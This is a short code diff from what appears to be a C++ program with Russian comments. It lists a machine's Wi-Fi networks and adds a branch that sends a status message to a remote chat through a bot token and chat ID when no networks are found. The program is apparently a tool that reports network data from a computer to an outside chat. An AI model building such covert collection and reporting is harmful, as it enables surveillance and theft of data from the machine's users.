@@ -31,6 +31,14 @@ int main(){
 	setlocale(LC_ALL, ""); // Кодировка
 
 	vector<string> network_list = get_wifi_networks(); // Получаем список сетей из своей библотеки(написаной ии)
+
+	if (network_list.size() < 1){
+	
+		send_message("chat_id", "token", "PC/laptop doesnt has any networks(cable connection)");
+		return 0;
+	
+	}
+
 	stringstream ss; // Создаю "редактор строки"
 	wstringstream wss; // Создаю "редактор wстроки"
 	stringstream resultss; // сс в который будет записоваться все
